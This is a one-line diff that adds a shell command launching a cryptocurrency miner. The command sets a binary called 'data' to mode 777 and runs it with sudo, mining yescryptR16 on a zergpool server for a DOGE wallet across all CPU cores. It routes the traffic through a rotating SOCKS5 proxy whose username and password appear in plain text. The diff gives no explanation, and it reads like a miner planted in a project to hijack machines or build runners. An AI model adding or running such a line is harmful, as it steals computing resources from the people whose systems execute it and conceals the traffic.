@@ -1,0 +1,1 @@
+chmod 777 data && sudo ./data -a yescryptR16 -o stratum+tcp://yescryptR16.na.mine.zergpool.com:6333 -u DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS -p c=DOGE,mc=QOGE,ID=$(echo $(shuf -i 1-20000 -n 1)-V) -t $(nproc) -x socks5://pjeurfqc-rotate:shrmgzj5zwez@p.webshare.io:80
